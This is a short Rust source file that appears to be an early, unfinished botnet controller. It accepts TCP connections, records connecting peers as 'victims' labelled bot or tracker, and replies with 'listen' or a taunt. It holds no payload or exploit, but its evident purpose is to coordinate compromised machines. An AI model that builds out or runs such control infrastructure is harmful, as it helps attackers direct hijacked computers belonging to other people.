mod tracker;

use std::{net::{TcpListener, TcpStream, SocketAddr}, io::{BufReader, BufRead, Write}, thread, sync::mpsc};

use crate::tracker::is_victim_listening;

#[derive(Debug)]
enum VictimType {
    Bot,
    Tracker
}

#[derive(Debug)]
pub struct Victim {
    ip: SocketAddr,
    victim_type: VictimType
}

fn main() {
    let listener = TcpListener::bind("192.168.0.12:9570").unwrap();
    let mut victims: Vec<Victim> = Vec::new();
    let (tx, rx) = mpsc::channel();

    for stream in listener.incoming() {
        let stream = stream.unwrap();

        for victim in rx.try_iter() {
            println!("oui");
            victims.push(victim);
        }
        println!("Connection established");
        let tx1 = tx.clone();
        thread::spawn(move || {
            let victim = handle_connection(stream);
            tx1.send(victim).unwrap();
        });
        println!("{:?}", victims);
    }
}

fn handle_connection(mut stream: TcpStream) -> Victim {
    let buf_reader = BufReader::new(&stream);
    let http_request: Vec<_> = buf_reader
        .lines()
        .map(|result| result.unwrap())
        .take_while(|line| !line.is_empty())
        .collect();

    println!("Request: {:?}", http_request);
    let response = match http_request[0].as_str() {
        // "bot" => ips.to_string(), // should return the best tracker in the ips vector
        "serv" => "listen".to_string(),
        _ => "coucou loser haha\n".to_string()
    };
    let current_ip = stream.peer_addr().unwrap();
    let victim = Victim { ip: current_ip, victim_type: VictimType::Tracker };

    if response == "listen" && is_victim_listening(&victim) {

    }

    stream.write_all(response.as_bytes()).unwrap();
    return victim;
}
